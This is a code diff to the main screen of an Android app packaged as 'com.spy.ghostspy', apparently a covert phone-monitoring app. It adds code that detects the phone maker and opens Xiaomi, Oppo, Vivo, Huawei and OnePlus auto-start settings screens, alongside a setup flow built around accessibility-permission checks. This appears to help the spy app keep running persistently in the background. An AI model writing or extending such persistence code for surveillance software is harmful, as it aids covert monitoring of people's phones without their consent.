@@ -3,6 +3,7 @@ package com.spy.ghostspy;
 import androidx.appcompat.app.AppCompatActivity;
 
 import android.annotation.SuppressLint;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.net.Uri;
@@ -52,7 +53,7 @@ public class MainActivity extends AppCompatActivity {
         requestPowerManger();
 //        if(!isAccessibilityPermissionGranted(getApplicationContext())) {
 //            mLayoutWebview.setVisibility(View.GONE);
-            mLayoutSetting.setVisibility(View.VISIBLE);
+        mLayoutSetting.setVisibility(View.VISIBLE);
 //        } else {
 //            WebSettings webSettings = _webview.getSettings();
 //            webSettings.setJavaScriptEnabled(true);
@@ -79,6 +80,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void setReady() {
+        onRequestAutoStart();
         mBtnAllow1 = (Button) findViewById(R.id.btn_allow1);
         mBtnEnable1 = (Button) findViewById(R.id.btn_enable1);
         mBtnAllow2 = (Button) findViewById(R.id.btn_allow2);
@@ -130,11 +132,12 @@ public class MainActivity extends AppCompatActivity {
     }
 
     public void setLayout() {
+        String manufacturer = android.os.Build.MANUFACTURER.toLowerCase();
         Log.d("version::", Build.VERSION.RELEASE);
         if(Integer.parseInt(Build.VERSION.RELEASE) < 11) {
             mLayoutButton3.setVisibility(View.VISIBLE);
         } else {
-            if (Build.MANUFACTURER.toLowerCase(Locale.US).equals("samsung")) {
+            if (manufacturer.equals("samsung") || manufacturer.equals("motorola")) {
                 mLayoutButton2.setVisibility(View.VISIBLE);
             } else {
                 mLayoutButton1.setVisibility(View.VISIBLE);
@@ -142,6 +145,63 @@ public class MainActivity extends AppCompatActivity {
         }
 
     }
+
+    private void onRequestAutoStart() {
+        String manufacturer = android.os.Build.MANUFACTURER.toLowerCase();
+        switch (manufacturer) {
+            case "xiaomi":
+                openXiaomiAutoStartSettings();
+                break;
+            case "oppo":
+                openOppoAutoStartSettings();
+                break;
+            case "vivo":
+                openVivoAutoStartSettings();
+                break;
+            case "huawei":
+                openHuaweiAutoStartSettings();
+                break;
+            case "oneplus":
+                openOnePlusAutoStartSettings();
+                break;
+            default:
+                openBatteryOptimizationSettings();
+                break;
+        }
+    }
+
+    private void openXiaomiAutoStartSettings() {
+        Intent intent = new Intent();
+        intent.setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"));
+        startActivity(intent);
+    }
+
+    private void openOppoAutoStartSettings() {
+        Intent intent = new Intent();
+        intent.setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.privacypermissionsentry.PermissionTopActivity"));
+        startActivity(intent);
+    }
+
+    private void openVivoAutoStartSettings() {
+        Intent intent = new Intent();
+        intent.setComponent(new ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"));
+        startActivity(intent);
+    }
+
+    private void openHuaweiAutoStartSettings() {
+        Intent intent = new Intent();
+        intent.setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"));
+        startActivity(intent);
+    }
+
+    private void openOnePlusAutoStartSettings() {
+        Intent intent = new Intent();
+        intent.setComponent(new ComponentName("com.oneplus.security", "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity"));
+        startActivity(intent);
+    }
+    private void openBatteryOptimizationSettings() {
+    }
+
 
     public static boolean isAccessibilityPermissionGranted(Context context) {
         int accessibilityEnabled = 0;
